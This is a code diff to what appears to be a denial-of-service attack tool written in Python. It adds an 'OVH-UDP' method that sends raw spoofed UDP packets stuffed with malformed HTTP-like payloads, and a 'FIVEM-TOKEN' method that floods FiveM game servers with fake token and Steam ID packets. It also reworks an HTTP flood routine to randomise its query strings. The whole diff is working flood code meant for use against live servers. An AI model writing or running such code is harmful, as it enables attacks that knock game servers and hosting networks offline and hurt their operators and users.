@@ -10,7 +10,7 @@ from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from re import compile
-from random import choice as randchoice
+from random import choice as randchoice, randint
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
@@ -136,8 +136,8 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
-                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
-                                "TS3", "MCPE", "ICMP"
+                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
+                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
@@ -469,6 +469,8 @@ class Layer4(Thread):
             "TS3": self.TS3,
             "MCPE": self.MCPE,
             "FIVEM": self.FIVEM,
+            "FIVEM-TOKEN": self.FIVEMTOKEN,
+            "OVH-UDP": self.OVHUDP, 
             "MINECRAFT": self.MINECRAFT,
             "CPS": self.CPS,
             "CONNECTION": self.CONNECTION,
@@ -539,6 +541,14 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
+    def OVHUDP(self) -> None:
+        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
+            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            while True:
+                for payload in self._generate_ovhudp():
+                    Tools.sendto(s, payload, self._target)
+        Tools.safe_close(s)
+
     def ICMP(self) -> None:
         payload = self._genrate_icmp()
         s = None
@@ -558,8 +568,7 @@ class Layer4(Thread):
 
     def AMP(self) -> None:
         s = None
-        with suppress(Exception), socket(AF_INET, SOCK_RAW,
-                                         IPPROTO_UDP) as s:
+        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, *next(self._amp_payloads)):
                 continue
@@ -597,6 +606,24 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
+    def FIVEMTOKEN(self) -> None:
+        global BYTES_SEND, REQUESTS_SENT
+
+        # Generete token and guid
+        token = str(uuid4())
+        steamid_min = 76561197960265728
+        steamid_max = 76561199999999999
+        guid = str(randint(steamid_min, steamid_max))
+
+        # Build Payload
+        payload_str = f"token={token}&guid={guid}"
+        payload = payload_str.encode('utf-8')
+
+        with socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+
     def FIVEM(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
@@ -623,6 +650,41 @@ class Layer4(Thread):
             while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
+
+    def _generate_ovhudp(self) -> List[bytes]:
+        packets = []
+
+        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
+        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']
+
+        for _ in range(randint(2, 4)):
+            ip = IP()
+            ip.set_ip_src(__ip__)
+            ip.set_ip_dst(self._target[0])
+
+            udp = UDP()
+            udp.set_uh_sport(randint(1024, 65535))
+            udp.set_uh_dport(self._target[1])
+
+            payload_size = randint(1024, 2048)
+            random_part = randbytes(payload_size).decode("latin1", "ignore")
+
+            method = randchoice(methods)
+            path = randchoice(paths)
+
+            payload_str = (
+                f"{method} {path}{random_part} HTTP/1.1\n"
+                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
+            )
+
+            payload = payload_str.encode("latin1", "ignore")
+
+            udp.contains(Data(payload))
+            ip.contains(udp)
+
+            packets.append(ip.get_packet())
+
+        return packets
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
@@ -1160,7 +1222,10 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def GSB(self):
-        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                            self._target.raw_path_qs,
                                                            ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
@@ -1176,9 +1241,6 @@ class HttpFlood(Thread):
                              'Sec-Gpc: 1\r\n'
                              'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
